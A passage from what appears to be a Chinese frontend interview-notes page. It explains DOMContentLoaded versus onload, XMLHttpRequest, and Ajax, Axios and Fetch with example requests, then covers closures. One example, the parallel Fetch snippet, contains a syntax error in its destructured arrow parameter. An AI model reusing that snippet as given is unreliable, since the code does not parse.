<li><p><strong>用途：</strong></p>
<ul>
<li><code>DOMContentLoaded</code> 通常用于执行与DOM操作相关的初始化工作。因为它在DOM解析完成后触发，所以可以安全地访问和操作DOM元素。</li>
<li><code>onload</code> 通常用于执行与页面依赖资源相关的初始化工作，例如图片加载完成后的操作。它也可以用于执行其他一些需要在页面完全加载后才执行的任务。</li>
</ul>
</li>
</ol>
<p>举例来说，如果您希望在DOM解析完成后立即执行某些操作（例如修改DOM元素），则可以使用 <code>DOMContentLoaded</code> 事件。如果您希望等待所有页面资源加载完成后再执行某些操作（例如测量页面元素的尺寸），则可以使用 <code>onload</code> 事件。</p>
<p>需要注意的是，不同浏览器对这两个事件的触发时机可能存在一些微小的差异，因此在编写代码时最好考虑到这些差异。</p>
<h2 id="js基础篇"><a href="#js基础篇" class="headerlink" title="js基础篇"></a>js基础篇</h2><h3 id="x3D-x3D-1、ajax、axios、fetch对比-x3D-x3D"><a href="#x3D-x3D-1、ajax、axios、fetch对比-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、ajax、axios、fetch对比&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、ajax、axios、fetch对比&#x3D;&#x3D;</h3><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7211103821082394682">https://juejin.cn/post/7211103821082394682</a></p>
<h5 id="XMLHttpRequest（XHR）原理"><a href="#XMLHttpRequest（XHR）原理" class="headerlink" title="XMLHttpRequest（XHR）原理"></a>XMLHttpRequest（XHR）原理</h5><p>XMLHttpRequest（XHR）是一个用于发起 HTTP 请求的浏览器内置对象，它允许 JavaScript 代码与服务器进行通信，从服务器获取数据或将数据发送到服务器。XHR 的原理可以简要概括如下：</p>
<ol>
<li><p><strong>创建 XMLHttpRequest 对象：</strong> 在 JavaScript 中，可以通过创建 XMLHttpRequest 对象来使用 XHR。通常，你可以使用 <code>new XMLHttpRequest()</code> 来创建一个新的 XHR 实例。</p>
</li>
<li><p><strong>配置请求：</strong> 一旦创建了 XHR 对象，你需要配置它以执行特定的 HTTP 请求。你可以设置请求的方法（GET、POST、PUT、DELETE 等）、URL、是否异步等参数。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>设置回调函数：</strong> XHR 允许你为请求的不同阶段设置回调函数。常见的回调函数包括请求成功时的回调、请求失败时的回调等。你可以使用 <code>onload</code>、<code>onerror</code> 等事件监听器来设置这些回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xhr.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-comment">// 请求成功，处理响应数据</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xhr.<span class="hljs-property">responseText</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 请求失败</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed with status:&#x27;</span>, xhr.<span class="hljs-property">status</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>发送请求：</strong> 配置完成后，使用 <code>send()</code> 方法来发送请求。如果是异步请求，你可以在发送请求后继续执行其他代码，而不需要等待请求完成。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>处理响应：</strong> 当服务器响应到达时，会触发事先设置的回调函数。你可以从 <code>xhr.responseText</code> 中获取响应的文本数据，或者使用其他属性来获取响应的状态码、头部信息等。</p>
</li>
</ol>
<p>XHR 的工作原理是通过浏览器提供的底层 HTTP 协议栈与服务器进行通信，发送请求并接收响应。XHR 支持同步和异步请求，但在现代 Web 开发中，通常使用异步请求，以避免阻塞页面渲染。</p>
<p>需要注意的是，虽然 XHR 是传统的网络请求方式，但现代 Web 开发中更常见的是使用 Fetch API 或其他基于 Promise 的网络请求库（如 Axios）。这些方法更简单、可读性更好，并且提供了更强大的功能。</p>
<h5 id="Ajax、Axios-和-Fetch-API-对比"><a href="#Ajax、Axios-和-Fetch-API-对比" class="headerlink" title="Ajax、Axios 和 Fetch API 对比"></a>Ajax、Axios 和 Fetch API 对比</h5><p>在前端开发中，Ajax、Axios 和 Fetch API 都是用于进行网络请求的工具。以下是它们之间的对比，并提供了一些示例：</p>
<ol>
<li><strong>Ajax：</strong> Ajax（Asynchronous JavaScript and XML）是一种使用原生JavaScript进行异步通信的技术。它通常使用 <code>XMLHttpRequest</code> 对象来发起网络请求。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, <span class="hljs-literal">true</span>);<br><br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>  &#125;<br>&#125;;<br><br>xhr.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>Axios：</strong> Axios 是一个基于Promise的HTTP客户端，用于在浏览器和Node.js中发送HTTP请求。它提供了更容易使用和处理的API，并支持拦截器、并发请求等功能。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 使用Axios发送GET请求</span><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>Fetch API：</strong> Fetch API 是JavaScript的新标准，提供了一种现代的方式来进行网络请求。它返回一个Promise，使用<code>fetch</code>函数发送请求。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 使用Fetch API发送GET请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">response</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p><code>fetch</code> 是基于 Promise 的 API，用于进行网络请求和获取资源。它是现代 JavaScript 中用于发起 HTTP 请求的一种方式，取代了传统的 <code>XMLHttpRequest</code>。</p>
<p><code>fetch</code> 基于 Promise 的特性，使得处理异步网络请求更加简单和可控。它返回一个 Promise 对象，可以通过 <code>.then()</code> 和 <code>.catch()</code> 方法来处理请求的结果和错误。这意味着你可以使用 Promise 的链式调用来处理多个异步操作，使代码更加清晰和可读。</p>
<p>以下是一个使用 <code>fetch</code> 的简单示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>(); <span class="hljs-comment">// 解析 JSON 数据</span><br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// 处理获取到的数据</span><br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;There was a problem with the fetch operation:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>在这个示例中，<code>fetch</code> 返回一个 Promise，我们可以使用 <code>.then()</code> 方法处理成功的情况，使用 <code>.catch()</code> 方法处理失败的情况。这种链式调用的方式使得异步操作更加可管理。</p>
<p>需要注意的是，<code>fetch</code> 默认不会将网络请求视为网络错误，即使响应状态码为 404 或 500，它也会认为请求成功。因此，在 <code>.then()</code> 中通常会检查响应的 <code>ok</code> 属性来判断请求是否成功。如果需要处理其他状态码，可以自行添加条件。</p>
<p>总之，<code>fetch</code> 是基于 Promise 的网络请求 API，提供了现代的、可控的方式来进行网络通信，适用于前端和后端通信以及获取各种类型的资源。</p>
<p>对比：</p>
<ul>
<li><p><strong>Promises vs Callbacks：</strong> Axios 和 Fetch API 使用Promises来处理异步操作，使得代码更加清晰和可维护，而Ajax通常使用回调函数，可能导致回调地狱（Callback Hell）。</p>
</li>
<li><p><strong>API和功能丰富程度：</strong> Axios提供了更多的高级功能，如请求和响应拦截器、并发请求等，而Fetch API更为基础，需要额外的工作来处理非常复杂的用例。</p>
</li>
<li><p><strong>浏览器兼容性：</strong> Fetch API是HTML5标准的一部分，不支持IE浏览器（需要使用polyfill），而Ajax和Axios支持各种现代和旧版浏览器。</p>
</li>
</ul>
<p>根据您的项目需求和目标浏览器支持，选择适合您的网络请求工具。Axios通常是一个很好的选择，因为它提供了一组功能齐全的工具，同时兼容现代浏览器。Fetch API也是一个不错的选择，特别是对于现代Web应用程序。</p>
<h5 id="补充：复杂场景的实例"><a href="#补充：复杂场景的实例" class="headerlink" title="补充：复杂场景的实例"></a>补充：复杂场景的实例</h5><p>以下是一些稍微复杂的场景示例，分别演示了如何使用 Ajax、Axios 和 Fetch API 来处理不同类型的网络请求：</p>
<p><strong>场景 1：发送 POST 请求并处理 JSON 响应</strong></p>
<p>使用 Ajax：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, <span class="hljs-literal">true</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(requestData));<br></code></pre></td></tr></table></figure>

<p>使用 Axios：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, requestData, &#123;<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>&#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>使用 Fetch API：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(requestData),<br>&#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p><strong>场景 2：发送多个并行请求并处理结果</strong></p>
<p>使用 Axios：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-keyword">const</span> request1 = axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data1&#x27;</span>);<br><span class="hljs-keyword">const</span> request2 = axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data2&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">[response1, response2]</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response 1:&#x27;</span>, response1.<span class="hljs-property">data</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response 2:&#x27;</span>, response2.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Requests failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>使用 Fetch API：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> request1 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data1&#x27;</span>);<br><span class="hljs-keyword">const</span> request2 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data2&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">responses</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(responses.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>    &#125;));<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>([data1, data2] =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data 1:&#x27;</span>, data1);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data 2:&#x27;</span>, data2);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Requests failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p><strong>场景 3：使用拦截器处理请求和响应</strong></p>
<p>使用 Axios：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 添加请求拦截逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Request interceptor:&#x27;</span>, config);<br>  <span class="hljs-keyword">return</span> config;<br>&#125;);<br><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 添加响应拦截逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response interceptor:&#x27;</span>, response);<br>  <span class="hljs-keyword">return</span> response;<br>&#125;);<br><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure>

<p>请注意，Fetch API 不提供类似的拦截器功能，因此在处理请求和响应时，需要在 <code>fetch</code> 调用之前和之后手动添加逻辑。</p>
<p>这些示例展示了使用 Ajax、Axios 和 Fetch API 处理复杂场景的方法，包括发送 POST 请求、处理多个并行请求和使用拦截器。选择适合您项目需求和喜好的网络请求库，并根据需要添加适当的功能和逻辑。</p>
<h3 id="2、变量提升"><a href="#2、变量提升" class="headerlink" title="2、变量提升"></a>2、变量提升</h3><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6933377315573497864">彻底解决 JS 变量提升的面试题</a>	(很细，真·彻底解决)</p>
</blockquote>
<h3 id="3、闭包"><a href="#3、闭包" class="headerlink" title="3、闭包"></a>3、闭包</h3><p>闭包（Closure）是JavaScript中一个重要且强大的概念，它发生在一个函数内部可以访问该函数外部的变量时。理解闭包对于深入理解JavaScript的作用域和函数的工作方式至关重要。</p>
<p>以下是对闭包的理解和关键特点：</p>
<ol>
<li><p><strong>函数嵌套：</strong> 闭包通常涉及到函数的嵌套。内部函数嵌套在外部函数内部，并且内部函数可以访问外部函数的变量。</p>
</li>
<li><p><strong>变量捕获：</strong> 当内部函数引用了外部函数的变量时，即使外部函数已经执行完毕并返回，这些变量仍然会被内部函数引用和保留。这就是闭包的核心特点之一。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&quot;I am from outer&quot;</span>;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 内部函数引用了外部函数的变量</span><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> inner; <span class="hljs-comment">// 返回内部函数</span><br>&#125;<br><br><span class="hljs-keyword">var</span> closureFunction = <span class="hljs-title function_">outer</span>(); <span class="hljs-comment">// 调用outer并将内部函数赋值给closureFunction</span><br><span class="hljs-title function_">closureFunction</span>(); <span class="hljs-comment">// 调用内部函数，仍然可以访问outerVar</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>保护数据：</strong> 闭包可以用于创建私有变量，因为外部作用域无法直接访问内部函数中的变量。这种方式可以保护数据不被外部意外修改。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    count++;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">var</span> increment = <span class="hljs-title function_">counter</span>();<br><span class="hljs-title function_">increment</span>(); <span class="hljs-comment">// 输出1</span><br><span class="hljs-title function_">increment</span>(); <span class="hljs-comment">// 输出2</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>延长变量生命周期：</strong> 闭包可以使外部函数的变量在外部函数执行完毕后继续存在，直到内部函数不再被引用。这对于一些特定的需求非常有用，但也需要注意不会造成不必要的内存泄漏。</p>
</li>
</ol>
